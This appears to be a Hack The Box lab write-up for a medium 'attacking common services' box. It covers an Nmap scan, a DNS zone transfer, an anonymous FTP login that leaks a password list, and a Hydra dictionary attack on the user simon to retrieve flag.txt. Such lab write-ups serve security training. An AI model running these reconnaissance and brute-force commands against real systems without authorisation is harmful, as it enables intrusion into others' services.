---
tags:
  - htb
  - linux
  - services
  - medium
draft: false
date: 2026-06-29
title: attacking-common-services-medium
---

### Q1: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.

We begin with an Nmap scan to identify open ports and active services on the target machine:

```
sudo nmap -sC -sV -A -T4 $ipAddress$
````

The scan reveals several interesting entry points, including a non-standard FTP service and DNS:

- **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu)
- **Port 53/tcp:** ISC BIND 9.16.1 (DNS)
- **Port 110/995/tcp:** Dovecot POP3/POP3S
- **Port 2121/tcp:** ProFTPD (InlaneFTP)   
- **Port 30021/tcp:** ProFTPD (Internal FTP)

Since DNS is active, we can attempt a DNS Zone Transfer (`AXFR`) against the target domain to map out internal hosts:

Bash

```
dig axfr @$ipAddress$ inlanefreight.htb
```

The zone transfer successfully leaks internal records, revealing that `int-ftp.inlanefreight.htb` maps to `127.0.0.1`, confirming that the high-port FTP servers are bound locally for internal testing and backups.

While the primary production FTP instance on port `2121` rejects anonymous authentication, we can target the secondary internal FTP service running on port `30021`.

We connect to this service using unauthenticated anonymous credentials:

```
ftp $ipAddress$ 30021
```

- **Username:** `anonymous`
- **Password:** _[Press Enter]_

Once logged in, we navigate to the `/simon` directory and download a cleartext developer note file:

```
ftp> cd simon
ftp> get mynotes.txt
ftp> exit
```

Reading `mynotes.txt` exposes a list of candidate passwords used by company administrators.

Next, we leverage the leaked password list to perform a dictionary attack against the production FTP service on port `2121` for the user `simon` using Hydra:

```
hydra -l "simon" -P mynotes.txt ftp://$ipAddress$:2121
```

The tool successfully isolates the correct password.

Finally, we establish an authenticated session on the main production server to extract our objective:

```
ftp $ipAddress$ 2121
```

```
ftp> ls
-rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
drwxrwxr-x   3 simon    simon        4096 Apr 18  2022 Maildir
ftp> get flag.txt
ftp> exit
```

We read the downloaded file locally to retrieve the final flag:

```
cat flag.txt
```

This way, I obtained the flag and completed the lab.